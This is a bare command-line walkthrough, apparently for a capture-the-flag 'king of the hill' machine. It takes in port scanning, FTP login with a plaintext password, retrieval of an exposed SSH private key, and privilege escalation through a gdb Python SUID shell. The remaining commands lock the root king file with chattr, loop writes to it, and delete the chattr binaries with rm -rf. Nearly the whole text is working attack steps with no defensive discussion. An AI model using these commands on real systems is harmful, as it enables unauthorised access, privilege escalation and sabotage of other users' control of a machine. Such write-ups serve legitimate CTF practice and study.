
```bash
export ip=ip

ping -c 2 $ip

kali> nmap $ip
PORT     STATE SERVICE
21/tcp   open  ftp (Has password)
22/tcp   open  ssh
80/tcp   open  http
8009/tcp open  ajp13
8080/tcp open  http-proxy
9999/tcp open  abyss

kali> ftp $ip ftp:EkRYje58bhFpg2uW

kali> gobuster -u http://$ip/ -w /usr/share

kali> curl http://$ip/robots.txt

kali> curl http://$ip/Cpxtpt2hWCee9VFa.txt >id_rsa

kali> chmod 600 id_rsa

kali> ssh - id_rsa shrek@$ip

shrek> gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit

sh-4.2# chattr -i /root/king.txt && (while true; do echo cyber30 >> /root/king.txt; sleep 0.1; done) & chattr +i /root/king.txt

sh-4.2# rm -rf /bin/chattr /usr/bin/chattr

sh-4.2# find / -name flag.txt 2>/dev/null
```